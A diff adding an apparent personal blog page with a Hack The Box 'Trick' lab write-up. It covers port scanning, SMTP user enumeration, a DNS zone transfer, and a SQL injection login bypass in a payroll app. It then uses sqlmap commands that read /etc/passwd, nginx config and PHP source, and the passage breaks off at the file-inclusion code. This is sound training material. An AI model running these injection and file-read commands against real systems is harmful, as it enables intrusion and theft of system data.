@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="shortcut icon" href="https://jordangalida.github.io/images/ability_poisons.jpg" />
+<title>HTB Trick Write-up | Jordan&#39;s Blog</title>
+<meta name="title" content="HTB Trick Write-up" />
+<meta name="description" content="A write-up for the Trick box." />
+<meta name="keywords" content="HTB,Pentesting," />
+
+
+<meta property="og:url" content="https://jordangalida.github.io/htb-trick-write-up/">
+  <meta property="og:site_name" content="Jordan&#39;s Blog">
+  <meta property="og:title" content="HTB Trick Write-up">
+  <meta property="og:description" content="A write-up for the Trick box.">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2025-02-19T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-19T00:00:00+00:00">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Pentesting">
+    <meta property="og:image" content="https://jordangalida.github.io/images/share.png">
+
+
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://jordangalida.github.io/images/share.png">
+  <meta name="twitter:title" content="HTB Trick Write-up">
+  <meta name="twitter:description" content="A write-up for the Trick box.">
+
+
+
+
+  <meta itemprop="name" content="HTB Trick Write-up">
+  <meta itemprop="description" content="A write-up for the Trick box.">
+  <meta itemprop="datePublished" content="2025-02-19T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-02-19T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2276">
+  <meta itemprop="image" content="https://jordangalida.github.io/images/share.png">
+  <meta itemprop="keywords" content="HTB,Pentesting">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  :root {
+      --width: 800px;
+      --font-main: "Courier New", monospace;
+      --font-secondary: "Courier New", monospace;
+      --font-scale: 1em;
+      --background-color: #fff;
+      --heading-color: #222;
+      --text-color: #444;
+      --link-color: #32ab60;
+      --visited-color:  #32ab60;
+      --code-background-color: #f2f2f2;
+      --code-color: #222;
+      --blockquote-color: #222;
+      --overflow-wrap: break-word;
+  }
+
+  @media (prefers-color-scheme: dark) {
+      :root {
+          --background-color: #070b0a;
+          --heading-color: #32ab60;
+          --text-color: #32ab60;
+          --link-color: #32ab60;
+          --visited-color:  #32ab60;
+          --code-background-color: #272822;
+          --code-color: #ddd;
+          --blockquote-color: #ccc;
+      }
+  }
+
+  body {
+      font-family: var(--font-secondary);
+      font-size: var(--font-scale);
+      margin: auto;
+      padding: 20px;
+      max-width: var(--width);
+      text-align: left;
+      background-color: var(--background-color);
+      word-wrap: break-word;
+      overflow-wrap: break-word;
+      white-space: normal;
+      line-height: 1.5;
+      color: var(--text-color);
+  }
+
+  h1, h2, h3, h4, h5, h6 {
+      font-family: var(--font-main);
+      color: var(--heading-color);
+  }
+
+  a {
+      color: var(--link-color);
+      cursor: pointer;
+      text-decoration: none;
+  }
+
+  a:hover {
+      text-decoration: underline; 
+  }
+
+  nav a {
+      margin-right: 8px;
+  }
+
+  strong, b {
+      color: var(--heading-color);
+  }
+
+  button {
+      margin: 0;
+      cursor: pointer;
+  }
+
+  main {
+      line-height: 1.6;
+  }
+
+  table {
+      width: 100%;
+  }
+
+  hr {
+      border: 0;
+      border-top: 1px dashed;
+  }
+
+  img {
+      max-width: 100%;
+  }
+
+  pre {
+      white-space: pre-wrap !important;
+      overflow-x: auto !important;
+      word-break: break-all !important;
+      max-width: var(--width) !important;
+      margin: 0 !important;
+  }
+
+  code {
+      font-family: "Courier New", monospace;
+      background-color: var(--code-background-color);
+      color: var(--code-color);
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      overflow-wrap: anywhere;
+  }
+
+  blockquote {
+      border-left: 1px solid #999;
+      color: var(--code-color);
+      padding-left: 20px;
+      font-style: italic;
+      text-wrap: wrap;
+  }
+
+  footer {
+      padding: 25px 0;
+      text-align: center;
+  }
+
+  .title:hover {
+      text-decoration: none;
+  }
+
+  .title h1 {
+      font-size: 1.5em;
+  }
+
+  .inline {
+      width: auto !important;
+  }
+
+  .highlight, .code {
+      background-color: var(--code-background-color);
+      color: var(--code-color);
+      padding: 5px 10px;
+      word-break: normal;
+      white-space: pre-wrap; 
+      overflow-wrap: anywhere;
+      overflow-x: auto;
+  }
+
+   
+  ul.blog-posts {
+      list-style-type: none;
+      padding: unset;
+  }
+
+  ul.blog-posts li {
+      display: flex;
+  }
+
+  ul.blog-posts li span {
+      flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+      color: var(--visited-color);
+</style>
+
+</head>
+
+<body>
+  <header><a href="/" class="title">
+  <h2>Jordan&#39;s Blog</h2>
+</a>
+<nav><a href="/">Home</a>
+
+
+<a href="/blog">Blog</a>
+
+</nav>
+</header>
+  <main>
+
+<h1>HTB Trick Write-up</h1>
+<p>
+  <i>
+    <time datetime='2025-02-19'>
+      19 Feb, 2025
+    </time>
+  </i>
+</p>
+
+<content>
+  <p>In this box, we start out using a zone transfer to find a new subdomain that leads us to third party payroll software which is vulnerable to unauthenticated SQL injection. We then use this SQL injection to read local files and eventually identify a user on the system as well as another subdomain that is vulnerable to LFI. We are able to leverage the LFI to read the SSH private key of the user we identified and gain initial access. Upon establishing a foothold, we find that we are a part of a group that has the ability to restart <code>fail2ban</code> as well as edit the <code>action.d</code> directory. We use this to elevate our privileges.</p>
+<hr>
+<p>As always, we start off with an nmap scan on all ports with scripts and service detection enabled</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -sC -sV -p- 10.10.11.166 -oA Scans/trick_all
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-19 13:01 EST
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.166
+</span></span><span style="display:flex;"><span>Host is up (0.031s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65531 closed tcp ports (reset)
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
+</span></span><span style="display:flex;"><span>|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
+</span></span><span style="display:flex;"><span>25/tcp open  smtp    Postfix smtpd
+</span></span><span style="display:flex;"><span>|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+</span></span><span style="display:flex;"><span>53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
+</span></span><span style="display:flex;"><span>| dns-nsid:
+</span></span><span style="display:flex;"><span>|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.14.2
+</span></span><span style="display:flex;"><span>|_http-title: Coming Soon - Start Bootstrap Theme
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.14.2
+</span></span><span style="display:flex;"><span>Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>As usual, port 80 is open so we check the website
+<img src="images/Trick/website.png" alt="Website"></p>
+<p>Looks like this is a landing page that is collecting users before they officially launch to gauge interest. We do a quick directory fuzz with <code>gobuster</code> but don&rsquo;t find anything. We try entering an email address, but nothing happens.</p>
+<p>Let&rsquo;s check out SMTP</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$telnet 10.10.11.166 <span style="color:#ae81ff">25</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>VRFY root
+</span></span><span style="display:flex;"><span>252 2.0.0 root
+</span></span><span style="display:flex;"><span>VRFY nonexist
+</span></span><span style="display:flex;"><span>550 5.1.1 &lt;nonexist&gt;: Recipient address rejected: User unknown in local recipient table
+</span></span></code></pre></div><p>We can user the VRFY command to enumerate users. However, we need a wordlist. Let&rsquo;s try to get a domain name. We can use <code>nslookup</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$nslookup
+</span></span><span style="display:flex;"><span>&gt; server 10.10.11.166
+</span></span><span style="display:flex;"><span>Default server: 10.10.11.166
+</span></span><span style="display:flex;"><span>Address: 10.10.11.166#53
+</span></span><span style="display:flex;"><span>&gt; 10.10.11.166
+</span></span><span style="display:flex;"><span>166.11.10.10.in-addr.arpa       name = trick.htb
+</span></span></code></pre></div><p>You can also use <code>dig</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>dig -x 10.10.11.166 @10.10.11.166
+</span></span></code></pre></div><p>Then we can try a zone transfer</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$dig axfr trick.htb @10.10.11.166
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>; &lt;&lt;&gt;&gt; DiG 9.18.33-1~deb12u2-Debian &lt;&lt;&gt;&gt; axfr trick.htb @10.10.11.166
+</span></span><span style="display:flex;"><span>;; global options: +cmd
+</span></span><span style="display:flex;"><span>trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+</span></span><span style="display:flex;"><span>trick.htb.              604800  IN      NS      trick.htb.
+</span></span><span style="display:flex;"><span>trick.htb.              604800  IN      A       127.0.0.1
+</span></span><span style="display:flex;"><span>trick.htb.              604800  IN      AAAA    ::1
+</span></span><span style="display:flex;"><span>preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
+</span></span><span style="display:flex;"><span>trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+</span></span><span style="display:flex;"><span>;; Query time: 33 msec
+</span></span><span style="display:flex;"><span>;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
+</span></span><span style="display:flex;"><span>;; WHEN: Wed Feb 19 15:27:06 EST 2025
+</span></span><span style="display:flex;"><span>;; XFR size: 6 records (messages 1, bytes 231)
+</span></span></code></pre></div><p>And we find a subdomain. When we navigate to the subdomain, we are presented with a login portal
+<img src="/images/Trick/preprod.png" alt="Preprod-payroll"></p>
+<p>We try a few weak credentials, but nothing. However, looking at the traffic in Burp, the responses for a failed login are just numbers. Taking a look at the source code shows something is happening on the client-side</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>	<span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;#login-form&#39;</span>).<span style="color:#a6e22e">submit</span>(<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">e</span>){
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">preventDefault</span>()
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;#login-form button[type=&#34;button&#34;]&#39;</span>).<span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;disabled&#39;</span>,<span style="color:#66d9ef">true</span>).<span style="color:#a6e22e">html</span>(<span style="color:#e6db74">&#39;Logging in...&#39;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">$</span>(<span style="color:#66d9ef">this</span>).<span style="color:#a6e22e">find</span>(<span style="color:#e6db74">&#39;.alert-danger&#39;</span>).<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">$</span>(<span style="color:#66d9ef">this</span>).<span style="color:#a6e22e">find</span>(<span style="color:#e6db74">&#39;.alert-danger&#39;</span>).<span style="color:#a6e22e">remove</span>();
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">ajax</span>({
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">url</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;ajax.php?action=login&#39;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">method</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">data</span><span style="color:#f92672">:</span><span style="color:#a6e22e">$</span>(<span style="color:#66d9ef">this</span>).<span style="color:#a6e22e">serialize</span>(),
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">error</span><span style="color:#f92672">:</span><span style="color:#a6e22e">err</span>=&gt;{
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;#login-form button[type=&#34;button&#34;]&#39;</span>).<span style="color:#a6e22e">removeAttr</span>(<span style="color:#e6db74">&#39;disabled&#39;</span>).<span style="color:#a6e22e">html</span>(<span style="color:#e6db74">&#39;Login&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			},
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">success</span><span style="color:#f92672">:</span><span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">resp</span>){
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">resp</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>){
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;index.php?page=home&#39;</span>;
+</span></span><span style="display:flex;"><span>				}<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">resp</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>){
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;voting.php&#39;</span>;
+</span></span><span style="display:flex;"><span>				}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;#login-form&#39;</span>).<span style="color:#a6e22e">prepend</span>(<span style="color:#e6db74">&#39;&lt;div class=&#34;alert alert-danger&#34;&gt;Username or password is incorrect.&lt;/div&gt;&#39;</span>)
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;#login-form button[type=&#34;button&#34;]&#39;</span>).<span style="color:#a6e22e">removeAttr</span>(<span style="color:#e6db74">&#39;disabled&#39;</span>).<span style="color:#a6e22e">html</span>(<span style="color:#e6db74">&#39;Login&#39;</span>);
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		})
+</span></span><span style="display:flex;"><span>	})
+</span></span></code></pre></div><p>Interesting, it says if the response is equal to 2, then reference <code>voting.php</code>. Can we intercept these? We can, but changing the response to 2 takes us to <code>voting.php</code> which isn&rsquo;t found and changing it to 1 attempts to take us to a home page, but it fails. Let&rsquo;s try to navigate to the <code>ajax.php?action=login</code>
+<img src="/images/Trick/ajax.png" alt="ajax.php"></p>
+<p>However, looking more into this doesn&rsquo;t result in anything. Let&rsquo;s go back to the original subdomain we found, <code>preprod-payroll</code>, and see if this is a custom application or not. This may be some third party application that is being hosted. Looking through the source code doesn&rsquo;t indicate much. After a lot of trial and error, we end up using a google dork that shows results with the same page title</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>intitle:&#34;Admin | Employee&#39;s Payroll Management System&#34;
+</span></span></code></pre></div><p>In the search results, we see multiple websites that have the exact same page title suggesting this is a third party software being hosted by our target machine. Googling for exploits - <code>Employee's Payroll Management System exploit</code>, immediately returns information about a SQL injection authentication bypass
+<img src="/images/Trick/sqli.png" alt="SQLi"></p>
+<p>This works and we log in as the administrator!
+<img src="/images/Trick/admin.png" alt="SQLi"></p>
+<p>Looking through the application, we find a user&rsquo;s tab that as the administrator user and an <code>Edit</code> function which reveals the password
+<img src="/images/Trick/reveal.png" alt="SQLi"></p>
+<p>We find a password &ldquo;SuperGucciRainbowCake&rdquo;. We don&rsquo;t really find much after that, so we go back to the original SQL injection that originally got us in. We can use <code>SQLMap</code> to enumerate further, but dumping the <code>user</code> table just shows us the same password we discovered earlier. As I&rsquo;ve mentioned before in these write-ups, SQL injection goes much further than just dumping a database. We can also potentially read and write files, and sometimes even obtain remote code execution. Let&rsquo;s try to read a file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sqlmap -r req.txt --file-read<span style="color:#f92672">=</span>/etc/passwd --thread <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[19:26:40] [INFO] retrieved: 2351
+</span></span><span style="display:flex;"><span>[19:26:57] [INFO] the local file &#39;/home/jsmooth/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd&#39; and the remote file &#39;/etc/passwd&#39; have the same size (2351 B)
+</span></span><span style="display:flex;"><span>files saved to [1]:
+</span></span><span style="display:flex;"><span>[*] /home/jsmooth/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd (same file)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[19:26:57] [INFO] fetched data logged to text files under &#39;/home/jsmooth/.local/share/sqlmap/output/preprod-payroll.trick.htb&#39;
+</span></span></code></pre></div><p>*Note: this took forever. To make it go faster try adding <code>--risk 3 --level 5 --technique BEU</code></p>
+<p>Looking at the <code>/etc/passwd</code> file we can see a user <code>michael</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$cat /home/jsmooth/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
+</span></span><span style="display:flex;"><span>dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+</span></span><span style="display:flex;"><span>avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+</span></span><span style="display:flex;"><span>Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
+</span></span><span style="display:flex;"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span style="display:flex;"><span>sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>michael:x:1001:1001::/home/michael:/bin/bash
+</span></span></code></pre></div><p>We could also grep for any user with a shell to find what we are mainly interested in</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$grep <span style="color:#e6db74">&#34;sh</span>$<span style="color:#e6db74">&#34;</span> /home/jsmooth/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>michael:x:1001:1001::/home/michael:/bin/bash
+</span></span></code></pre></div><p>Let&rsquo;s see if we have any privileges</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action<span style="color:#f92672">=</span>login --data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username=abc&amp;password=abc&#34;</span> -p username --batch --privileges
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[20:17:10] [INFO] adjusting time delay to 1 second due to good response times
+</span></span><span style="display:flex;"><span>&#39;remo&#39;@&#39;localhost&#39;
+</span></span><span style="display:flex;"><span>[20:18:19] [INFO] fetching number of privileges for user &#39;remo&#39;
+</span></span><span style="display:flex;"><span>[20:18:19] [INFO] retrieved: 1
+</span></span><span style="display:flex;"><span>[20:18:21] [INFO] fetching privileges for user &#39;remo&#39;
+</span></span><span style="display:flex;"><span>[20:18:21] [INFO] retrieved: FILE
+</span></span><span style="display:flex;"><span>database management system users privileges:
+</span></span><span style="display:flex;"><span>[*] %remo% [1]:
+</span></span><span style="display:flex;"><span>   privilege: FILE
+</span></span></code></pre></div><p>Looks like we have FILE privileges which we already know since we read <code>/etc/passwd</code>. This privileges also means we can write files. The first thing I tried to do is grab a SSH private key in Michael&rsquo;s home directory, but that didn&rsquo;t work. My next thoughts are to see if there are any more subdomains we can find, and look at the source code.</p>
+<p>First let&rsquo;s look for more subdomains. We saw in the requests that the this site is running on nginx, so let&rsquo;s go to the <code>sites-enabled</code> directory and download the <code>default</code> file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sqlmap -r req.txt --risk <span style="color:#ae81ff">3</span> --level <span style="color:#ae81ff">5</span> --technique<span style="color:#f92672">=</span>BEU --batch --file-read<span style="color:#f92672">=</span>/etc/nginx/sites-enabled/default
+</span></span></code></pre></div><p>We are able to find another site named <code>preprod-marketing</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>server {
+</span></span><span style="display:flex;"><span>        listen 80;
+</span></span><span style="display:flex;"><span>        listen [::]:80;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        server_name preprod-marketing.trick.htb;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        root /var/www/market;
+</span></span><span style="display:flex;"><span>        index index.php;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        location / {
+</span></span><span style="display:flex;"><span>                try_files $uri $uri/ =404;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        location ~ \.php$ {
+</span></span><span style="display:flex;"><span>                include snippets/fastcgi-php.conf;
+</span></span><span style="display:flex;"><span>                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We add that to our <code>/etc/hosts</code> file and navigate to the page
+<img src="images/Trick/marketing.png" alt="Marketing"></p>
+<p>Nothing super interesting there, so I grab the source code</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sqlmap -r req.txt --risk <span style="color:#ae81ff">3</span> --level <span style="color:#ae81ff">5</span> --technique<span style="color:#f92672">=</span>BEU --batch --file-read<span style="color:#f92672">=</span>/var/www/market/index.php
+</span></span></code></pre></div><p>It&rsquo;s very simple, but looks like there is some filtering to replace any <code>../</code> which would be indicative of local file inclusions</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$cat ~/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php
+</span></span><span style="display:flex;"><span>&lt;?php
+</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> $_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;page&#39;</span><span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
